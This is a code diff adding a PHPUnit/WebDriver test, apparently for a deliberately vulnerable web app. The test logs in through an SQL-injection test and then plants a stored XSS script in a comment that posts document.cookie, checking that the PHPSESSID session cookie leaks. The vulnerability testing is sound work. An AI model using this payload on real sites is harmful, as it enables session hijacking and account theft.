@@ -34,4 +34,22 @@ class VulnerabilitiesTest extends PHPUnit_Framework_TestCase {
         $this->assertContains('root', $this->webDriver->getPageSource());
     }
 
+    public function testXSS()
+    {
+        // First, login as Admin.
+        $this->testAdminSQLInjectionLogin();
+
+        // Open the article and send the XSS Javascript script.
+        $this->webDriver->get($this->url . "?page=read.php&article_id=1");
+        $commentField = $this->webDriver->findElement(WebDriverBy::name('body'));
+        $commentField->sendKeys("
+              <script>$.post(\"?page=comment.php\", {\"article_id\": 1, \"body\": document.cookie});</script>
+        ")->submit();
+
+        // Check that the XSS worked (leaked SID cookie)
+        $this->webDriver->get($this->url . "?page=read.php&article_id=1");
+        $this->assertContains('PHPSESSID', $this->webDriver->getPageSource());
+
+    }
+
 }
